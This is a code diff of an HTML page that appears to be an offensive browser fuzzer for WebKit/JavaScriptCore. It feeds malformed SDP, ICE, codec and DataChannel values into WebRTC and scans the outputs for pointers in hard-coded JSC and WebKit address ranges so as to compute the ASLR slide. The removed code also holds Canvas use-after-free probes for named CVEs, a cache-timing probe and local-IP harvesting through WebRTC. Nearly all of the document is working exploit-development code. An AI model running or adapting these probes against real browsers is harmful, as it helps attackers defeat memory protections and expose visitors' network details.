@@ -1,33 +1,44 @@
 <!doctype html><html><head>
 <meta charset=utf8>
 <meta name=viewport content="width=device-width,initial-scale=1">
+<title>WebRTC OOB Fuzzer</title>
 <style>
-body{background:#0c0c0c;color:#e4e4e4;font-family:monospace;font-size:12px;padding:14px}
+body{background:#0c0c0c;color:#e4e4e4;font-family:monospace;font-size:12px;padding:14px;max-width:520px}
 .btns{display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap}
-button{background:#ff453a;color:#fff;border:none;padding:9px 16px;border-radius:5px;font-size:12px;cursor:pointer}
+button{background:#ff453a;color:#fff;border:none;padding:10px 18px;border-radius:6px;font-size:12px;cursor:pointer}
 button.s{background:#222;border:1px solid #333}
 button.cp{background:#32d74b;color:#000}
 button:active{opacity:.7}
-#o{background:#161616;border:1px solid #2a2a2a;border-radius:6px;padding:12px;min-height:420px;max-height:560px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.8}
+#o{background:#161616;border:1px solid #2a2a2a;border-radius:6px;padding:12px;min-height:400px;max-height:560px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.8}
 .g{color:#32d74b}.r{color:#ff453a}.a{color:#ff9f0a}.d{color:#555}
-#slide{background:#1a0000;border:2px solid #ff453a;border-radius:6px;padding:10px;margin-bottom:10px;display:none;color:#ff453a;font-weight:bold;font-size:12px}
-#copymsg{color:#32d74b;font-size:11px;margin-left:4px;display:none}
+#slide{background:#1a0000;border:2px solid #ff453a;border-radius:6px;padding:10px;margin-bottom:10px;display:none;color:#ff453a;font-weight:bold}
+#info{background:#0a1a0a;border:1px solid #32d74b;border-radius:6px;padding:10px;margin-bottom:10px;font-size:11px;color:#32d74b}
 </style></head><body>
+<div id="info">
+✅ Running from: <span id="origin"></span><br>
+📡 RTCPeerConnection: <span id="rtcStatus">checking...</span>
+</div>
 <div class="btns">
   <button onclick="runAll()">▶ Run All</button>
-  <button class="s" onclick="runWebRTCOOB()">📡 WebRTC OOB</button>
-  <button class="s" onclick="runCanvasUAF()">🎨 Canvas UAF</button>
-  <button class="s" onclick="runDataLeak()">💧 Data Leak</button>
-  <button class="s" onclick="runWebRTCSDP()">📋 SDP Extremes</button>
+  <button class="s" onclick="runSDP()">📋 SDP OOB</button>
+  <button class="s" onclick="runCodec()">🎵 Codec</button>
+  <button class="s" onclick="runICE()">🧊 ICE</button>
+  <button class="s" onclick="runDC()">📡 DataChan</button>
+  <button class="s" onclick="runStats()">📊 Stats</button>
   <button class="cp" onclick="copyLog()">📋 Copy</button>
   <button class="s" onclick="clearLog()">🗑</button>
-  <span id="copymsg">Copied!</span>
 </div>
 <div id="slide"></div>
 <div id="o"></div>
 <script>
-var JSC_LO=0x180000000,JSC_HI=0x30000000000;
-var JSC_TLO=0x198ce6000,JSC_THI=0x1b37db000;
+document.getElementById('origin').textContent=location.origin;
+var rtcOk=typeof RTCPeerConnection!=='undefined';
+document.getElementById('rtcStatus').textContent=rtcOk?'✅ Available':'❌ BLOCKED';
+document.getElementById('rtcStatus').style.color=rtcOk?'#32d74b':'#ff453a';
+
+var HEAP_LO=0x104000000,HEAP_HI=0x400000000;
+var TEXT_LO=0x198ce6000,TEXT_HI=0x1b37db000;
+var WK_LO=0x19e3cb000,WK_HI=0x1fba00000;
 var pb=new ArrayBuffer(8),pf=new Float64Array(pb),pu=new Uint32Array(pb);
 
 function w(s,c){
@@ -44,481 +55,262 @@ function hit(s){
   var sl=document.getElementById('slide');
   sl.style.display='block';sl.textContent+='★ '+s+'\n';
 }
-function clearLog(){
-  document.getElementById('o').innerHTML='';
-  document.getElementById('slide').style.display='none';
-  document.getElementById('slide').textContent='';
-}
+function clearLog(){document.getElementById('o').innerHTML='';document.getElementById('slide').style.display='none';document.getElementById('slide').textContent='';}
 function copyLog(){
-  var text=document.getElementById('o').textContent;
-  navigator.clipboard.writeText(text).then(function(){
-    var m=document.getElementById('copymsg');m.style.display='inline';
-    setTimeout(function(){m.style.display='none';},2000);
-  }).catch(function(){
-    var ta=document.createElement('textarea');ta.value=text;
-    ta.style.cssText='position:fixed;left:-9999px';
-    document.body.appendChild(ta);ta.select();document.execCommand('copy');
-    document.body.removeChild(ta);
-    var m=document.getElementById('copymsg');m.style.display='inline';
-    setTimeout(function(){m.style.display='none';},2000);
+  navigator.clipboard.writeText(document.getElementById('o').textContent).then(function(){
+    var b=document.querySelector('.cp');b.textContent='✓ Copied!';setTimeout(function(){b.textContent='📋 Copy';},2000);
   });
 }
-function chk(val,lbl){
-  if(typeof val!=='number'||isNaN(val)||!isFinite(val)) return false;
-  pf[0]=val;
-  var lo=pu[0],hi=pu[1],approx=hi*4294967296+lo;
-  if(approx>=JSC_LO&&approx<=JSC_HI){
-    hit('PTR ('+lbl+'): 0x'+approx.toString(16));
-    if(approx>=JSC_TLO&&approx<=JSC_THI) hit('JSC TEXT! slide~0x'+(approx-JSC_TLO).toString(16));
-    return true;
-  }
+function chkReal(v,lbl){
+  if(typeof v!=='number'||isNaN(v)||!isFinite(v)||v===0) return false;
+  pf[0]=v;var lo=pu[0],hi=pu[1],a=hi*4294967296+lo;
+  if(lo<0x100000&&hi<0x100000) return false;
+  if(a>=TEXT_LO&&a<=TEXT_HI){hit('JSC TEXT ('+lbl+'): 0x'+a.toString(16)+' +0x'+(a-TEXT_LO).toString(16));return true;}
+  if(a>=WK_LO&&a<=WK_HI){hit('WebKit ('+lbl+'): 0x'+a.toString(16));return true;}
+  if(a>=HEAP_LO&&a<=HEAP_HI){hit('HEAP ('+lbl+'): 0x'+a.toString(16));return true;}
   return false;
 }
 function chkBuf(buf,lbl){
   if(!buf||buf.byteLength<8) return 0;
-  var u32=new Uint32Array(buf),found=0;
-  for(var i=0;i<u32.length-1;i+=2){
-    var approx=u32[i+1]*4294967296+u32[i];
-    if(approx>=JSC_LO&&approx<=JSC_HI){hit('PTR '+lbl+'['+i+']: 0x'+approx.toString(16));found++;}
-  }
-  return found;
+  var u=new Uint32Array(buf),f=0;
+  for(var i=0;i<u.length-1;i+=2){
+    var lo=u[i],hi=u[i+1],a=hi*4294967296+lo;
+    if(lo<0x100000&&hi<0x100000) continue;
+    if((a>=TEXT_LO&&a<=TEXT_HI)||(a>=WK_LO&&a<=WK_HI)||(a>=HEAP_LO&&a<=HEAP_HI)){
+      hit('PTR '+lbl+'['+i*4+']: 0x'+a.toString(16));f++;
+    }
+  }return f;
 }
 
-// =====================================================
-// T1: WebRTC OOB (CVE-2026-64718, Bugzilla 313935)
-// Component: WebRTC — OOB access in WebRTC code
-// Attack surface: RTCPeerConnection + ICE + SCTP + SRTP
-// =====================================================
-async function runWebRTCOOB(){
-  w('\n=== WebRTC OOB (CVE-2026-64718) ===\n','g');
-  info('Bugzilla 313935 — WebRTC OOB access, present in 26.5.2');
+function mkPC(){return new RTCPeerConnection({iceServers:[]});}
+async function exch(p1,p2){
+  p1.onicecandidate=function(e){if(e.candidate)p2.addIceCandidate(e.candidate).catch(function(){});};
+  p2.onicecandidate=function(e){if(e.candidate)p1.addIceCandidate(e.candidate).catch(function(){});};
+  var o=await p1.createOffer();await p1.setLocalDescription(o);
+  await p2.setRemoteDescription(o);var a=await p2.createAnswer();
+  await p2.setLocalDescription(a);await p1.setRemoteDescription(a);
+}
 
-  // W1: RTCDataChannel with extreme message sizes
-  info('W1: RTCDataChannel extreme messages...');
+// SDP OOB tests
+async function runSDP(){
+  w('\n=== SDP OOB ===\n','g');
+  if(!rtcOk){warn('RTCPeerConnection not available!');return;}
+
+  function base(extra){
+    return 'v=0\r\no=- 1 1 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\n'+
+      'a=group:BUNDLE 0\r\n'+
+      'm=audio 9 UDP/TLS/RTP/SAVPF 111\r\n'+
+      'c=IN IP4 0.0.0.0\r\n'+
+      'a=ice-ufrag:AAAA\r\na=ice-pwd:AAAAAAAAAAAAAAAAAAAAAA\r\n'+
+      'a=fingerprint:sha-256 00:01:02:03:04:05:06:07:08:09:0A:0B:0C:0D:0E:0F:10:11:12:13:14:15:16:17:18:19:1A:1B:1C:1D:1E:1F\r\n'+
+      'a=setup:actpass\r\na=mid:0\r\na=sendrecv\r\na=rtcp-mux\r\n'+
+      'a=rtpmap:111 opus/48000/2\r\na=fmtp:111 minptime=10;useinbandfec=1\r\n'+
+      (extra||'')+'a=ssrc:1 cname:x\r\n';
+  }
+
+  var tests=[
+    ['PT=256',          base('a=rtpmap:256 opus/48000/2\r\n')],
+    ['PT=UINT32MAX',    base('a=rtpmap:4294967295 opus/48000/2\r\n')],
+    ['PT=-1',           base('a=rtpmap:-1 opus/48000/2\r\n')],
+    ['clockRate=0',     base('a=rtpmap:111 opus/0/2\r\n')],
+    ['clockRate=UMAX',  base('a=rtpmap:111 opus/4294967295/2\r\n')],
+    ['channels=0',      base('a=rtpmap:111 opus/48000/0\r\n')],
+    ['channels=65535',  base('a=rtpmap:111 opus/48000/65535\r\n')],
+    ['channels=UMAX',   base('a=rtpmap:111 opus/48000/4294967295\r\n')],
+    ['fmtp UMAX',       base('a=fmtp:111 minptime=4294967295;maxaveragebitrate=4294967295\r\n')],
+    ['ssrc=0',          base().replace('ssrc:1','ssrc:0')],
+    ['ssrc=UINT32MAX',  base().replace('ssrc:1','ssrc:4294967295')],
+    ['extmap=0',        base('a=extmap:0 urn:ietf:params:rtp-hdrext:ssrc-audio-level\r\n')],
+    ['extmap=256',      base('a=extmap:256 urn:ietf:params:rtp-hdrext:ssrc-audio-level\r\n')],
+    ['extmap=65535',    base('a=extmap:65535 urn:ietf:params:rtp-hdrext:ssrc-audio-level\r\n')],
+    ['50 PTs',          base().replace('SAVPF 111','SAVPF '+Array.from({length:50},function(_,i){return i+64;}).join(' '))],
+    ['rtcp-mux-only',   base()+'a=rtcp-mux-only\r\n'],
+    ['bundle-only',     base()+'a=bundle-only\r\n'],
+  ];
+
+  for(var ti=0;ti<tests.length;ti++){
+    var p1=mkPC(),p2=mkPC();
+    try{
+      p1.addTransceiver('audio');
+      await p1.setLocalDescription(await p1.createOffer());
+      try{
+        await p2.setRemoteDescription({type:'offer',sdp:tests[ti][1]});
+        var a=await p2.createAnswer();
+        ok('SDP['+tests[ti][0]+']: answer='+a.sdp.length+'B');
+        await p1.setRemoteDescription(a);
+      }catch(e){info('SDP['+tests[ti][0]+']: '+e.name+': '+e.message.slice(0,40));}
+    }catch(e){}
+    p1.close();p2.close();
+    await new Promise(function(r){setTimeout(r,30);});
+  }
+  ok('SDP done');
+}
+
+// Codec extremes
+async function runCodec(){
+  w('\n=== Codec Params ===\n','g');
+  if(!rtcOk){warn('RTCPeerConnection not available!');return;}
   try{
-    var pc1=new RTCPeerConnection({iceServers:[]});
-    var pc2=new RTCPeerConnection({iceServers:[]});
+    var caps=RTCRtpSender.getCapabilities('audio');
+    if(!caps){info('getCapabilities not available');return;}
+    ok('Codecs: '+caps.codecs.map(function(c){return c.mimeType;}).join(', '));
 
-    // Setup ICE
-    pc1.onicecandidate=function(e){if(e.candidate)pc2.addIceCandidate(e.candidate).catch(function(){});};
-    pc2.onicecandidate=function(e){if(e.candidate)pc1.addIceCandidate(e.candidate).catch(function(){});};
+    var p1=mkPC(),p2=mkPC();
+    var tr=p1.addTransceiver('audio');
 
-    // Create data channel
-    var dc1=pc1.createDataChannel('test',{ordered:false,maxRetransmits:0});
-    var dc2Ref=null;
+    var mods=[
+      {clockRate:0},{clockRate:4294967295},{clockRate:-1},
+      {channels:0},{channels:65535},{channels:4294967295},
+    ];
+    for(var mi=0;mi<mods.length;mi++){
+      try{
+        var c=Object.assign({},caps.codecs[0],mods[mi]);
+        tr.setCodecPreferences([c]);
+        warn('setCodecPreferences['+JSON.stringify(mods[mi])+']: ACCEPTED');
+      }catch(e){info('setCodecPrefs['+mi+']: '+e.name);}
+    }
 
-    pc2.ondatachannel=function(e){dc2Ref=e.channel;};
+    await exch(p1,p2);
+    await new Promise(function(r){setTimeout(r,500);});
 
-    // Exchange SDP
-    var offer=await pc1.createOffer();
-    await pc1.setLocalDescription(offer);
-    await pc2.setRemoteDescription(offer);
-    var answer=await pc2.createAnswer();
-    await pc2.setLocalDescription(answer);
-    await pc1.setRemoteDescription(answer);
+    var params=tr.sender.getParameters();
+    ok('params.encodings='+params.encodings.length);
 
-    // Wait for channel to open
-    await new Promise(function(resolve){
-      dc1.onopen=resolve;
-      setTimeout(resolve,3000);
+    var eTests=[
+      {maxBitrate:0},{maxBitrate:4294967295},{maxBitrate:-1},
+      {scaleResolutionDownBy:0},{scaleResolutionDownBy:4294967295},
+      {maxFramerate:0},{maxFramerate:4294967295},
+    ];
+    for(var ei=0;ei<eTests.length;ei++){
+      try{
+        var p=JSON.parse(JSON.stringify(params));
+        if(!p.encodings.length)p.encodings=[{}];
+        Object.assign(p.encodings[0],eTests[ei]);
+        await tr.sender.setParameters(p);
+        warn('setParameters['+JSON.stringify(eTests[ei])+']: ACCEPTED');
+      }catch(e){info('setParams['+ei+']: '+e.name);}
+    }
+    p1.close();p2.close();
+  }catch(e){info('Codec: '+e.name);}
+  ok('Codec done');
+}
+
+// ICE candidate extremes
+async function runICE(){
+  w('\n=== ICE Extremes ===\n','g');
+  if(!rtcOk){warn('RTCPeerConnection not available!');return;}
+  var p1=mkPC(),p2=mkPC();
+  try{
+    p1.addTransceiver('audio');
+    await p1.setLocalDescription(await p1.createOffer());
+    await p2.setRemoteDescription(p1.localDescription);
+    await p2.setLocalDescription(await p2.createAnswer());
+
+    var cands=[
+      ['priority UMAX',   'candidate:1 1 UDP 4294967295 192.168.1.1 9999 typ host'],
+      ['foundation 32',   'candidate:'+('X'.repeat(32))+' 1 UDP 2130706431 192.168.1.1 9999 typ host'],
+      ['foundation 256',  'candidate:'+('X'.repeat(256))+' 1 UDP 2130706431 192.168.1.1 9999 typ host'],
+      ['port 0',          'candidate:1 1 UDP 2130706431 192.168.1.1 0 typ host'],
+      ['port 65535',      'candidate:1 1 UDP 2130706431 192.168.1.1 65535 typ host'],
+      ['component 65535', 'candidate:1 65535 UDP 2130706431 192.168.1.1 9999 typ host'],
+      ['0.0.0.0',         'candidate:1 1 UDP 2130706431 0.0.0.0 9999 typ host'],
+      ['255.255.255.255', 'candidate:1 1 UDP 2130706431 255.255.255.255 9999 typ host'],
+      ['ipv6 max',        'candidate:1 1 UDP 2130706431 ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff 9999 typ host'],
+      ['gen UMAX',        'candidate:1 1 UDP 2130706431 192.168.1.1 9999 typ host generation 4294967295'],
+      ['tcp port 0',      'candidate:1 1 TCP 1 192.168.1.1 0 typ host tcptype active'],
+      ['relay rport 0',   'candidate:1 1 UDP 100 192.168.1.1 9999 typ relay raddr 0.0.0.0 rport 0'],
+    ];
+
+    for(var ci=0;ci<cands.length;ci++){
+      try{
+        await p2.addIceCandidate({candidate:cands[ci][1],sdpMid:'0',sdpMLineIndex:0});
+        warn('ICE['+cands[ci][0]+']: ACCEPTED');
+      }catch(e){info('ICE['+cands[ci][0]+']: '+e.name);}
+      await new Promise(function(r){setTimeout(r,20);});
+    }
+  }catch(e){info('ICE: '+e.name);}
+  p1.close();p2.close();
+  ok('ICE done');
+}
+
+// DataChannel
+async function runDC(){
+  w('\n=== DataChannel Sizes ===\n','g');
+  if(!rtcOk){warn('RTCPeerConnection not available!');return;}
+  try{
+    var p1=mkPC(),p2=mkPC();
+    var dc1=p1.createDataChannel('x');
+    var dc2=null;
+    p2.ondatachannel=function(e){
+      dc2=e.channel;
+      dc2.onmessage=function(msg){
+        if(msg.data instanceof ArrayBuffer) chkBuf(msg.data,'DCRecv');
+      };
+    };
+    await exch(p1,p2);
+    await new Promise(function(r){
+      dc1.onopen=r;setTimeout(r,3000);
     });
 
     if(dc1.readyState==='open'){
-      ok('DataChannel open');
-
-      // Send extreme messages
-      var sizes=[1,100,65535,65536,1024*1024,4*1024*1024];
+      ok('DC open');
+      var sizes=[0,1,1023,1024,65535,65536,262143,262144];
       for(var si=0;si<sizes.length;si++){
         try{
-          var msg=new Uint8Array(sizes[si]);
-          // Fill with ptr-like pattern to detect OOB read
-          var u32v=new Uint32Array(msg.buffer);
-          for(var i=0;i<u32v.length;i++) u32v[i]=0x41414141+si;
-
+          var d=new Uint8Array(sizes[si]);
+          if(d.length>0){var u=new Uint32Array(d.buffer);for(var i=0;i<u.length;i++)u[i]=0xDEAD0000+si;}
           var T=performance.now();
-          dc1.send(msg);
-          var dt=performance.now()-T;
-          ok('send('+sizes[si]+'): '+dt.toFixed(0)+'ms');
-
-          // Check receive side
-          if(dc2Ref&&dc2Ref.readyState==='open'){
-            dc2Ref.onmessage=function(e){
-              if(e.data instanceof ArrayBuffer){
-                chkBuf(e.data,'RTCMsg_'+sizes[si]);
-              }
-            };
-          }
+          dc1.send(d.buffer||d);
+          ok('send('+sizes[si]+'B): '+(performance.now()-T).toFixed(1)+'ms');
         }catch(e){info('send('+sizes[si]+'): '+e.name);}
+        await new Promise(function(r){setTimeout(r,150);});
       }
-      await new Promise(function(r){setTimeout(r,500);});
-    } else {
-      info('DataChannel not open: '+dc1.readyState);
-    }
-    pc1.close();pc2.close();
-  }catch(e){info('W1: '+e.name+': '+e.message.slice(0,60));}
-
-  // W2: SCTP stream ID extremes
-  info('\nW2: SCTP stream ID extremes...');
-  try{
-    var pc3=new RTCPeerConnection({iceServers:[]});
-    var extremeStreamIds=[0,1,65534,65535,65536,0xFFFF,0x10000];
-    for(var ei=0;ei<extremeStreamIds.length;ei++){
-      try{
-        var dc=pc3.createDataChannel('ch'+ei,{
-          id:extremeStreamIds[ei],
-          negotiated:true
-        });
-        info('SCTP stream id='+extremeStreamIds[ei]+': '+dc.readyState);
-      }catch(e){info('SCTP id='+extremeStreamIds[ei]+': '+e.name);}
-    }
-    pc3.close();
-  }catch(e){info('W2: '+e.name);}
-
-  // W3: ICE candidate with extreme values
-  info('\nW3: ICE candidate injection...');
-  try{
-    var pc4=new RTCPeerConnection({iceServers:[]});
-    var pc5=new RTCPeerConnection({iceServers:[]});
-    pc4.createDataChannel('x');
-    var offer2=await pc4.createOffer();
-    await pc4.setLocalDescription(offer2);
-    await pc5.setRemoteDescription(offer2);
-
-    // Inject malformed ICE candidates
-    var malformedCandidates=[
-      // OOB port number
-      'candidate:1 1 UDP 2130706431 192.168.1.1 99999 typ host',
-      // Negative priority
-      'candidate:1 1 UDP 4294967295 192.168.1.1 9999 typ host',
-      // Huge foundation (string OOB?)
-      'candidate:'+('A'.repeat(1024))+' 1 UDP 1 127.0.0.1 1234 typ host',
-      // Empty foundation
-      'candidate: 1 UDP 1 127.0.0.1 1234 typ host',
-      // Overflow component
-      'candidate:1 65535 UDP 1 127.0.0.1 1234 typ host',
-    ];
-
-    for(var mi=0;mi<malformedCandidates.length;mi++){
-      try{
-        await pc5.addIceCandidate({
-          candidate:malformedCandidates[mi],
-          sdpMid:'0',
-          sdpMLineIndex:0
-        });
-        warn('Malformed ICE['+mi+']: accepted!');
-      }catch(e){info('ICE['+mi+']: '+e.name);}
-    }
-    pc4.close();pc5.close();
-  }catch(e){info('W3: '+e.name);}
-
-  ok('WebRTC OOB done');
-  await new Promise(function(r){setTimeout(r,50);});
+    }else info('DC state: '+dc1.readyState);
+    await new Promise(function(r){setTimeout(r,300);});
+    p1.close();p2.close();
+  }catch(e){info('DC: '+e.name);}
+  ok('DC done');
 }
 
-// =====================================================
-// T2: Canvas UAF (CVE-2026-43821, Bugzilla 314867)
-// Use-after-free in WebKit Canvas operations
-// =====================================================
-async function runCanvasUAF(){
-  w('\n=== Canvas UAF (CVE-2026-43821) ===\n','g');
-  info('Bugzilla 314867 — WebKit Canvas UAF, present in 26.5.2');
-
-  // CU1: Rapid canvas creation/destruction while drawing
-  info('CU1: Canvas create/destroy during draw operations...');
-  var leaks=[];
-  for(var i=0;i<50;i++){
-    try{
-      var canvas=document.createElement('canvas');
-      canvas.width=256;canvas.height=256;
-      var ctx=canvas.getContext('2d');
-
-      // Start drawing operations
-      ctx.fillStyle='rgba(222,173,190,0.5)';
-      ctx.fillRect(0,0,256,256);
-      ctx.beginPath();
-      ctx.arc(128,128,128,0,Math.PI*2);
-      ctx.fill();
-
-      // Get ImageData WHILE draw is potentially in flight
-      var imgData=ctx.getImageData(0,0,256,256);
-
-      // Now destroy canvas by removing all references
-      ctx=null;
-      canvas.width=0;canvas.height=0; // forces reallocation
-
-      // Check the (now potentially freed) imgData
-      var u32=new Uint32Array(imgData.data.buffer);
-      var ptrs=0;
-      for(var pi=0;pi<u32.length-1;pi+=2){
-        var approx=u32[pi+1]*4294967296+u32[pi];
-        if(approx>=JSC_LO&&approx<=JSC_HI){hit('Canvas UAF['+i+']: PTR in freed imageData!');ptrs++;}
-      }
-      if(ptrs>0) leaks.push({iter:i,ptrs:ptrs});
-
-      // Check if non-black/transparent pixels appeared
-      var unexpected=0;
-      for(var di=0;di<u32.length;di++){
-        var v=u32[di];
-        if(v!==0&&v!==0xFF000000&&v!==0xBEADDE00){
-          unexpected++;
-        }
-      }
-      if(unexpected>1000) warn('Canvas UAF['+i+']: '+unexpected+' unexpected pixels');
-
-      canvas=null;
-    }catch(e){}
-  }
-  ok('CU1: '+leaks.length+'/50 had ptrs');
-
-  // CU2: OffscreenCanvas transfer race
-  info('\nCU2: OffscreenCanvas transfer UAF...');
+// Stats scan
+async function runStats(){
+  w('\n=== Stats Scan ===\n','g');
+  if(!rtcOk){warn('RTCPeerConnection not available!');return;}
   try{
-    for(var j=0;j<30;j++){
-      var oc=new OffscreenCanvas(256,256);
-      var octx=oc.getContext('2d');
-      octx.fillStyle='red';
-      octx.fillRect(0,0,256,256);
-
-      // Get image data before transfer
-      var imgBefore=octx.getImageData(0,0,256,256);
-
-      // Transfer OffscreenCanvas to worker (detaches it)
-      // We can't easily do worker here, but we can use
-      // createImageBitmap on the transferring canvas
-      var bitmap=await createImageBitmap(oc);
-
-      // The octx should now be invalid (transferred)
-      try{
-        // Try to use octx after bitmap creation (UAF?)
-        octx.fillStyle='blue';
-        octx.fillRect(0,0,128,128);
-        var imgAfter=octx.getImageData(0,0,256,256);
-        var u32a=new Uint32Array(imgAfter.data.buffer);
-        var ptrs2=0;
-        for(var pi2=0;pi2<u32a.length-1;pi2+=2){
-          var approx2=u32a[pi2+1]*4294967296+u32a[pi2];
-          if(approx2>=JSC_LO&&approx2<=JSC_HI){hit('OffscreenCanvas UAF['+j+']: PTR!');ptrs2++;}
-        }
-        if(ptrs2===0&&imgAfter.data[0]!==0){
-          // Canvas still accessible — not UAF but maybe data leak
-          var blueFound=0;
-          for(var k=0;k<u32a.length;k++) if(u32a[k]===0xFF0000FF||u32a[k]===0xFFFF0000) blueFound++;
-        }
-      }catch(e){info('After transfer octx use: '+e.name);}
-      bitmap.close();
-    }
-  }catch(e){info('CU2: '+e.name);}
-
-  // CU3: Canvas context 2D image pattern UAF
-  info('\nCU3: Canvas pattern from freed image...');
-  try{
-    for(var k=0;k<20;k++){
-      var srcCanvas=document.createElement('canvas');
-      srcCanvas.width=64;srcCanvas.height=64;
-      var srcCtx=srcCanvas.getContext('2d');
-      srcCtx.fillStyle='rgb(222,173,190)';
-      srcCtx.fillRect(0,0,64,64);
-
-      // Create pattern FROM srcCanvas
-      var dstCanvas=document.createElement('canvas');
-      dstCanvas.width=256;dstCanvas.height=256;
-      var dstCtx=dstCanvas.getContext('2d');
-      var pattern=dstCtx.createPattern(srcCanvas,'repeat');
-
-      // Destroy srcCanvas while pattern holds reference
-      srcCanvas.width=0;srcCanvas.height=0;
-      srcCtx=null;srcCanvas=null;
-
-      // Use the pattern (UAF: pattern references freed canvas data)
-      dstCtx.fillStyle=pattern;
-      dstCtx.fillRect(0,0,256,256);
-
-      var img=dstCtx.getImageData(0,0,256,256);
-      var u32p=new Uint32Array(img.data.buffer);
-      var ptrs3=chkBuf(img.data.buffer,'CanvasPattern_'+k);
-      if(ptrs3>0) hit('Canvas pattern UAF['+k+']: PTR in pattern output!');
-
-      // Check for non-pattern values (freed heap content)
-      var nonPattern=u32p.filter(function(v){return v!==0&&v!==0xBEADDE00&&v!==0xFF000000;}).length;
-      if(nonPattern>0&&k<3) info('CU3['+k+']: '+nonPattern+' non-pattern pixels');
-
-      dstCanvas=null;pattern=null;
-    }
-    ok('CU3 done');
-  }catch(e){info('CU3: '+e.name);}
-
-  ok('Canvas UAF done');
-  await new Promise(function(r){setTimeout(r,50);});
-}
-
-// =====================================================
-// T3: Data Leak (CVE-2026-64778)
-// "Visiting a maliciously crafted website may leak sensitive data"
-// Probe various info disclosure channels
-// =====================================================
-async function runDataLeak(){
-  w('\n=== Data Leak Probe (CVE-2026-64778) ===\n','g');
-  info('CVE-2026-64778: website may leak sensitive data');
-  info('Probing: navigation timing, performance, storage info');
-
-  // DL1: Navigation timing
-  info('DL1: Navigation timing precision...');
-  try{
-    var nt=performance.getEntriesByType('navigation')[0];
-    if(nt){
-      var times=['startTime','redirectStart','redirectEnd','fetchStart',
-                  'domainLookupStart','domainLookupEnd','connectStart',
-                  'secureConnectionStart','connectEnd','requestStart',
-                  'responseStart','responseEnd','domInteractive',
-                  'domContentLoadedEventStart','domContentLoadedEventEnd',
-                  'domComplete','loadEventStart','loadEventEnd'];
-      for(var ti=0;ti<times.length;ti++){
-        var v=nt[times[ti]];
-        if(v!==0) info(times[ti]+': '+v.toFixed(3));
-        chk(v,'NavTiming_'+times[ti]);
-      }
-    }
-  }catch(e){info('DL1: '+e.name);}
-
-  // DL2: Storage quota estimates
-  info('\nDL2: Storage quota estimates...');
-  try{
-    var est=await navigator.storage.estimate();
-    ok('Storage estimate: usage='+est.usage+' quota='+est.quota);
-    chk(est.usage,'StorageUsage');chk(est.quota,'StorageQuota');
-  }catch(e){info('DL2: '+e.name);}
-
-  // DL3: Cross-origin iframe timing oracle
-  info('\nDL3: Same-site cookie leak via timing...');
-  try{
-    // Check if cache timing exposes visited links
-    var urlsToCheck=['https://apple.com','https://google.com'];
-    for(var ui=0;ui<urlsToCheck.length;ui++){
-      var T=performance.now();
-      try{
-        var resp=await fetch(urlsToCheck[ui],{mode:'no-cors',cache:'force-cache'});
-        var dt=performance.now()-T;
-        info('fetch('+urlsToCheck[ui].slice(8,20)+'): '+dt.toFixed(0)+'ms — cache hint');
-        chk(dt,'FetchTiming_'+ui);
-      }catch(e){info('fetch('+urlsToCheck[ui].slice(8,20)+'): '+e.name);}
-    }
-  }catch(e){info('DL3: '+e.name);}
-
-  // DL4: WebRTC IP leak
-  info('\nDL4: WebRTC local IP discovery...');
-  try{
-    var pc=new RTCPeerConnection({iceServers:[]});
-    pc.createDataChannel('x');
-    var offer=await pc.createOffer();
-    await pc.setLocalDescription(offer);
-    var candidates=[];
-    await new Promise(function(resolve){
-      pc.onicecandidate=function(e){
-        if(e.candidate){
-          var parts=e.candidate.candidate.split(' ');
-          if(parts[7]==='host') candidates.push(parts[4]);
-        } else resolve();
-      };
-      setTimeout(resolve,2000);
+    var p1=mkPC(),p2=mkPC();
+    p1.createDataChannel('x');
+    await exch(p1,p2);
+    await new Promise(function(r){setTimeout(r,500);});
+    var stats=await p1.getStats();
+    var n=0;
+    stats.forEach(function(r){
+      Object.entries(r).forEach(function(kv){
+        if(typeof kv[1]==='number'){chkReal(kv[1],'stat_'+r.type+'_'+kv[0]);n++;}
+      });
     });
-    ok('Local IPs via WebRTC: '+candidates.join(', '));
-    pc.close();
-  }catch(e){info('DL4: '+e.name);}
-
-  // DL5: Performance memory (if available)
-  info('\nDL5: performance.memory...');
-  if(performance.memory){
-    ok('jsHeapSizeLimit: '+performance.memory.jsHeapSizeLimit);
-    ok('totalJSHeapSize: '+performance.memory.totalJSHeapSize);
-    ok('usedJSHeapSize: '+performance.memory.usedJSHeapSize);
-    chk(performance.memory.usedJSHeapSize,'JSHeapUsed');
-    chk(performance.memory.totalJSHeapSize,'JSHeapTotal');
-  } else info('performance.memory not available');
-
-  ok('Data leak probe done');
-  await new Promise(function(r){setTimeout(r,50);});
-}
-
-// =====================================================
-// T4: SDP extremes — target the WebRTC OOB
-// The OOB is in WebRTC parsing of SDP or ICE data
-// Fuzz SDP with extreme values
-// =====================================================
-async function runWebRTCSDP(){
-  w('\n=== SDP Extreme Fuzzing ===\n','g');
-  info('Fuzzing SDP to trigger WebRTC OOB (Bugzilla 313935)');
-
-  // Build malformed SDP
-  var baseSDP='v=0\r\n'+
-    'o=- 123456789 123456789 IN IP4 127.0.0.1\r\n'+
-    's=-\r\n'+
-    't=0 0\r\n'+
-    'a=group:BUNDLE 0\r\n'+
-    'm=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\n'+
-    'c=IN IP4 0.0.0.0\r\n'+
-    'a=ice-ufrag:abcd\r\n'+
-    'a=ice-pwd:abcdefghijklmnopqrstuvwx\r\n'+
-    'a=fingerprint:sha-256 AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99\r\n'+
-    'a=setup:actpass\r\n'+
-    'a=mid:0\r\n'+
-    'a=sctp-port:5000\r\n'+
-    'a=max-message-size:262144\r\n';
-
-  // SDP variant tests
-  var sdpTests=[
-    {name:'extreme sctp-port',        mod:function(s){return s.replace('5000','99999');}},
-    {name:'huge max-message-size',     mod:function(s){return s.replace('262144','4294967295');}},
-    {name:'negative max-msg-size',     mod:function(s){return s.replace('262144','-1');}},
-    {name:'overflow max-msg-size',     mod:function(s){return s.replace('262144','18446744073709551615');}},
-    {name:'long ice-ufrag',            mod:function(s){return s.replace('abcd','a'.repeat(65535));}},
-    {name:'long ice-pwd',              mod:function(s){return s.replace('abcdefghijklmnopqrstuvwx','a'.repeat(65535));}},
